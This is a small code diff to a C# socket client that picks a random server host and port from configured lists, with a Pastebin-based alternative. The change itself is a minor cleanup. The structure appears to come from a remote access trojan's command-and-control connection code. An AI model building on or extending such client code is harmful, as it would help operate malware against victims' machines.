@@ -43,7 +43,7 @@ namespace Client.Sockets
 
                 if (Settings.Pastebin == "null")
                 {
-                    string ServerIP = Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]);
+                    string ServerIP = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
                     int ServerPort = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);
 
                     if (IsValidDomainName(ServerIP)) //check if the address is alphanumric (meaning its a domain)
